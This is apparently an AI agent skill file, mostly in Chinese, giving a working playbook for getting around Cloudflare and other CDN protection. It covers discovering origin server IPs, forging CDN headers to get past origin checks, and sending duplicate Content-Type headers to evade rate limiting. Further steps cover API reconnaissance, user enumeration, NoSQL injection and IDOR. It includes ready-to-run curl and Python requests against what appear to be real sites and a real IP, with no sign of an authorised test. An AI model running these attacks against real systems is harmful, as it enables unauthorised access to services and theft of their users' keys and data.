---
name: 云帷·旁路
description: "CDN origin rejects direct access. Forge headers to bypass."
version: 1.0.0
license: MIT
platforms: [linux]
metadata:
    tags: [cdn, cloudflare, origin, bypass, waf, recon]
    category: ctf-pentest
---
# CDN Origin Bypass (forged CDN headers)

## 触发条件
- 目标在 CDN (Cloudflare/Akamai/EdgeOne) 后面, 已找到源站真实 IP
- 直连源站返回 403/429, 或需要绕过 CDN WAF 规则与限流
- `/api/*` 路径被 CF WAF 拦截 (403) 而页面正常 → 直接打源站
- 关键词: 源站、真实IP、CF绕过、WAF绕过、限流绕过

## 核心流程

### 1. 找源站真实 IP
| 方法 | 命令/手段 |
|---|---|
| **JS 硬编码** | 下载整站 HTML/JS, `grep -oE 'var ip = ["\x27][0-9.]+'` — 很多站点把"给用户配白名单的 IP"写死在 JS 里 (本案例: `var ip = '62.133.62.50'` 即源站) |
| **Git 历史泄露** | 目标有公开 GitHub 仓库时, `git fetch --unshallow` 拉全历史, 搜 `root@vmi*.contaboserver.net` 等 VPS 主机名邮箱 → `dig A` 即得源站 IP。详见 `references/git-history-origin-discovery.md` |
| FOFA/cert | `cert="domain" && port!="443" && port!="80"` 或 `host="domain"` 反查 |
| 历史 DNS | viewdns iphistory / securitytrails / hackertarget hostsearch |
| 端口特征 | 源站 2096/8443 (cPanel) 常被 CF 代理但暴露服务类型 |

验证: `curl -sk -H "Host: <domain>" https://<origin_ip>/` 返回与 CF 页面同 size (如 669KB SPA) = 源站确认。

### 2. 直连源站 + Host 头
```bash
curl -sk -H "Host: vortexprotocols.com" "https://62.133.62.50/api/session-check" -d '{}'
```
- 无 Host 头或错误 Host → nginx 默认 vhost (可能泄露多租户品牌列表, 见多租户泄露)
- 返回 403 `{"error":"Forbidden"}` 且 `server: nginx/1.18.0` → 源站有 **CDN 头校验**, 进入第 3 步

### 3. 🔑 伪造 CDN 头 (关键)
源站 nginx/后端只**检查头存在与否**, 不验证真实性。伪造以下头即可绕过:
```python
headers = {
    "Host": "vortexprotocols.com",
    "CF-Connecting-IP": "104.21.85.110",   # 任意 CF 边缘 IP
    "X-Forwarded-For": "104.21.85.110",
    "X-Real-IP": "104.21.85.110",
    "User-Agent": "Mozilla/5.0 ... Chrome/125.0.0.0 Safari/537.36",
    "Origin": "https://<domain>",
    "Referer": "https://<domain>/",
    "Content-Type": "application/json",
}
r = requests.post("https://<origin_ip>/api/session-check", headers=headers, json={})
```
- 成功信号: 从 403 变为 200 (如 `{"ok": true, "authed": false}`)
- **附带收益**: 源站通常没有 CDN 的限流/WAF, 429 消失, 可全量测试 API

### 4. 多租户 vhost 泄露
- 错误 Host 头 → "Domain Not Registered" 页面可能列出同服务器所有品牌 (Vortex/Helix/HyperFarm/PerpLabs/YieldChain)
- 提示: 多租户架构 + Telegram bot 管理域名 → 用户敏感数据 (API keys/私钥) 是核心资产, 优先找数据面

## Cloudflare 429 限流绕过（无需源站 IP）— 重复 Content-Type 头

目标在 CF 代理后面、拿不到源站 IP 时，注册/登录等端点被 CF WAF 429 限流（`{"detail":"Rate limit exceeded — try again later"}` 或 CF 429 页）的绕过法：

- CF WAF 限流规则常按 `Content-Type: application/json` 精确匹配；后端 FastAPI/Pydantic 同样要求 JSON
- **发送两个 `Content-Type` 头**：第一个 `application/json`（FastAPI 读取并解析 JSON），第二个 `text/plain`（CF 规则读取后不匹配 → 不触发限流）
```bash
curl -s -X POST "https://target/cloud/api/auth/register" \
  -H "Content-Type: application/json" -H "Content-Type: text/plain" \
  -H "User-Agent: Mozilla/5.0" \
  -d '{"name":"T","email":"x@gmail.com","password":"Pass1234!","turnstile_token":""}'
```
- 成功信号: 从 429 → 200（返回 token）或 422（到达后端, Pydantic 校验拒绝）
- ⚠️ **限速窗口仍在**: 同一 IP 短时间内连续请求仍会触发 CF 全局限速（第一次用重复头成功，随后仍 429）。适合"单发关键请求"（注册拿 token 一次、登录一次），不适合批量爆破
- 路径大小写变体 `/CLOUD/API/...` 可绕过 CF 规则但 FastAPI 路由区分大小写 → 405/404，通常不可用
- 变体测试结论: `application/json; charset=utf-8`、`Application/JSON`、`application/vnd.api+json` 仍被 CF 匹配 → 429; `text/plain`/`application/*`/`application/x-www-form-urlencoded` 绕过 CF 但后端 422
- 伪造 `X-Forwarded-For`/`CF-Connecting-IP` 等头被 CF 直接拦截（error code 1000），无效

## FastAPI Swagger/OpenAPI 侦察（CF 后站点最快攻击面发现）
- FastAPI 站点（响应 422 带 `detail`/`loc`/`ctx` 结构、`/docs` 存在）先探测: `/docs` `/openapi.json` `/redoc` — 即使主站 `/api` 404, FastAPI 子应用常挂 `/cloud/docs` `/cloud/openapi.json`
- openapi.json 一次拿到全端点 + 参数 schema + 认证需求（public vs AUTH），比 JS 逆向快得多
- 自动枚举: `python3 -c "import json; s=json.load(open('openapi.json')); [print(m.upper(),p,info.get('summary','')) for p,ms in s['paths'].items() for m,info in ms.items() if m in ('get','post','put','delete')]"`
- 常见未文档化 high-value: `/api/webhook/gumroad` `/api/webhook/nowpayments` `/api/pay/crypto` `/api/admin/config` `/api/admin/logs` `/api/verify`（license 验证常不限速）
- 重置密码用户枚举: `POST /api/auth/reset-password` 对不同邮箱返回不同消息（存在→"a new password has been generated"，不存在→"a reset has been sent"）；即使 password 字段为 null 也可枚举注册用户

## Pitfalls
- **HTTP 301 到 HTTPS**: 源站 HTTP 通常 301 → 必须用 `https://<origin_ip>` 测试
- **直接请求 CF IP (104.21.x/172.67.x) 会连接失败** — 那是 CF 边缘, 不是源站; 源站在 FOFA/JS 里找
- **限流是 IP 级**: 通过 CF 访问被 429 时, 浏览器 console 也 429; 只有直连源站 + 伪造 CF 头才不受限
- **伪造头要带全**: 单加 `CF-Connecting-IP` 不够, `X-Forwarded-For` + `X-Real-IP` 一起 (部分后端读 XFF)
- 源站 SSH 可能在非标准端口 (如 2299), 但认证后可能关闭; 先 nmap -p- 确认

## 后续攻击面 (数据面优先)
- 无认证 API 枚举: 从前端 JS 提取全部 `/api/*` 端点 (`grep -oE '"/api/[a-z0-9/_-]+"'` + fetch 上下文)
- Flask/Werkzeug 特征: 501 响应带 Werkzeug HTML、`Invalid action`/`bad user_type` 错误 → 严格入参校验, 试 NoSQL 注入 (`{"$ne": ""}` → 500)
- IDOR: 用法 `session_id`/`user_id` 作标识的端点 (工单/聊天), 传 `"admin"` 等值看是否放行
- 用户注册免验证 + `is_new` 字段 → 用户枚举

## References
- `references/vortexprotocols-case.md` — 完整案例: 源站发现 → CF 头伪造 → API 全解锁
- `references/deepalpha-cloudflare-bypass-case.md` — 重复 Content-Type 头绕过 CF 429 + FastAPI openapi 侦察 + 升级 plan 受阻路径 (deepalphabot 案例)
- `references/git-history-origin-discovery.md` — 从 Git 提交历史泄露中提取源站主机名/IP (Contabo VPS 模式)